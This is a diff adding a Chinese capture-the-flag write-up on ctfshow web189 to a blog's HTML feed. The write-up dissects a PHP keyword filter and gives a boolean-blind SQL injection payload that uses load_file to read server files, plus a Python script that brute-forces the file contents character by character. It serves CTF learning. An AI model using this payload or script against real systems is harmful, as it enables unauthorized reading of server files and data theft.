@@ -8289,10 +8289,13 @@
 <h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h4><p>进行布尔盲注的条件是页面会有回显作为语句执行是否成功的标志，一般我们可以先用永真条件<code>or 1=1</code>与永假条件<code>and 1=2</code>的返回内容是否存在差异进行判断是否可以进行布尔盲注</p>
 <p><strong>什么情况下考虑使用布尔盲注？*</strong>*</p>
 <ol>
-<li>该输入框存在注入点。</li>
-<li>该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。</li>
+<li><p>该输入框存在注入点。</p>
+</li>
+<li><p>该页面或请求不会回显注入语句执行结果，故无法使用UNION注入。</p>
+</li>
+<li><p>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</p>
+</li>
 </ol>
-<p>​	3. 对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入。</p>
 <p><strong>函数替换：1、如果程序过滤了substr函数，可以用其他函数代替：效果与substr（）一样</strong></p>
 <p>​	<strong>left（str，index）从左边第index开始截取</strong></p>
 <p>​	<strong>right(str，index)从右边第index开始截取</strong></p>
@@ -8780,7 +8783,37 @@
 <p>在官方手册中，如果在比较操作中涉及到字符串和数字，SQL 会尝试将字符串转换为数字，那么只要字符串不是以数字开头，比较时都会转为数字 0 。</p>
 <p>sql里，数字和字符串的匹配是弱类型比较，字符串会转换为数字，如0&#x3D;&#x3D;0a，那么如果输入的username是0，则会匹配所有开头不是数字或者为0的字符串和数字0。（具体的在web187中有提到）</p>
 <p>然后再来看password的判断，也是弱类型的比较，那么也直接输入0，尝试登录一个用户名和pass的开头是字母或是0的用户。<br><img src="/./../image/achieve/202411/sql%E6%B3%A8%E5%85%A5--ctfshow/ddaab1cd3c0461cb3542aa7ffb20400a.png" alt="在这里插入图片描述"></p>
-<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  //拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;      </span><br><span class="line">返回逻辑</span><br><span class="line">  //用户名检测</span><br><span class="line">  if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码检测</span><br><span class="line">  if(!is_numeric($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码判断</span><br><span class="line">  if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><h3 id="布尔盲注-3"><a href="#布尔盲注-3" class="headerlink" title="#布尔盲注"></a>#布尔盲注</h3><p>题目提示flag在api&#x2F;index.php文件中</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查询语句</span><br><span class="line">  //拼接sql语句查找指定ID用户</span><br><span class="line">  $sql = &quot;select pass from ctfshow_user where username = &#123;$username&#125;&quot;;      </span><br><span class="line">返回逻辑</span><br><span class="line">  //用户名检测</span><br><span class="line">  if(preg_match(&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;, $username))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;用户名非法&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码检测</span><br><span class="line">  if(!is_numeric($password))&#123;</span><br><span class="line">    $ret[&#x27;msg&#x27;]=&#x27;密码只能为数字&#x27;;</span><br><span class="line">    die(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //密码判断</span><br><span class="line">  if($row[&#x27;pass&#x27;]==$password)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;登陆成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的话应该是让我们去读取那个index.php文件，且注入点在username，那我们具体分析一下过滤了的字符有哪些</p>
+<ul>
+<li><code>select</code>, <code>and</code>, <code>or</code>, <code>into</code>, <code>from</code>, <code>where</code>, <code>join</code>, <code>sleep</code>, <code>benchmark</code>: 这些都是 SQL 中的关键字</li>
+<li><code> </code> (空格): 匹配空格字符，可能被用于分隔 SQL 关键字。</li>
+<li><code>\*</code>: 匹配星号 <code>*</code>，常用于选择所有列。</li>
+<li><code>\x09</code>, <code>\x0a</code>, <code>\x0b</code>, <code>\x0c</code>, <code>\x0d</code>: 这些是对应于不同类型的空白字符的十六进制表示，分别是水平制表符和换行符等。</li>
+<li><code>\xa0</code>: 匹配非断行空格（NBSP），可能用于绕过某些过滤。</li>
+<li><code>\x00</code>: 匹配空字符，通常用于字符串终止。</li>
+<li><code>\x26</code>: 匹配字符 <code>&amp;</code>，在某些情况下可能用于构造恶意的 SQL 查询。</li>
+<li><code>\x7c</code>: 匹配字符 <code>|</code>，也可能在某些注入中使用。</li>
+</ul>
+<p>这里的话可以看到联合注入和时间盲注(sleep和benchmark)应该是行不通的了，into被过滤了我们不能写入文件</p>
+<p>我们考虑一下布尔盲注的做法，先看看页面回显</p>
+<p>根据我们sql里的弱比较，当我们输入username为0的时候，还是会正常匹配所有开头不是数字或者为0的字符串和数字0，所以</p>
+<p>username&#x3D;0、password&#x3D;0时，返回“密码错误”。（说明存在用户，但是密码错误）<br>username&#x3D;1、password&#x3D;0时，返回“查询失败”。（说明用户不存在）</p>
+<p>因为我们这里的and和or都被过滤了，所以我们正常的1 and xxxx这种注入用不了，所以我们选用第二个’查询失败’的条件去进行注入</p>
+<p>payload:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;i&#125;,1)=&#x27;&#123;j&#125;&#x27;,1,0)</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取文件load-file-函数"><a href="#读取文件load-file-函数" class="headerlink" title="读取文件load_file()函数"></a>读取文件load_file()函数</h3><p><code>LOAD_FILE()</code> 函数是 MySQL 数据库中的一个函数，用于读取服务器上的文件内容。这个函数可以返回指定文件的内容，前提是 MySQL 用户具有访问该文件的权限，并且 MySQL 服务器能够读取该文件。</p>
+<p>基础语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD_FILE(file_name)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>file_name</code>：要读取的文件的完整路径，通常需要用单引号括起来，例如 <code>&#39;C:/path/to/file.txt&#39;</code>。</li>
+</ul>
+<p>但是这里还需要注意一个点，就是在index.php中我们并不知道flag在哪个位置，所以我们要一个个去试了，这里我直接给出其他师傅的脚本，做了一点点改动</p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#import time</span></span><br><span class="line"><span class="comment">#因为环境问题有时候会有网络延迟导致脚本判断出错，加上时间延迟这样可以保证脚本跑出来的数据不会出错</span></span><br><span class="line">url = <span class="string">&quot;http://f7b0966e-c6c1-4c2f-ae6d-93ccfa526305.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;&#125;&#123;&lt;&gt;$=,;_ &#x27;abcdefghijklmnopqr-stuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 这个位置，是群主耗费很长时间跑出来的位置~</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>, <span class="number">257</span> + <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;if(substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;x&#125;</span>&#x27;,1,0)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        response = requests.post(url, data=data)</span><br><span class="line">        <span class="comment"># time.sleep(0.3)</span></span><br><span class="line">        <span class="comment"># 8d25是username=1时的页面返回内容包含的，具体可以看上面的截图~</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;8d25&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;++++++++++++++++++ <span class="subst">&#123;x&#125;</span> is right&quot;</span>)</span><br><span class="line">            flag += x</span><br><span class="line">            <span class="built_in">print</span>(flag)  <span class="comment"># 确保缩进正确</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;&#125;&quot;</span> <span class="keyword">in</span> flag:  <span class="comment"># 判断 flag 是否获取完整</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
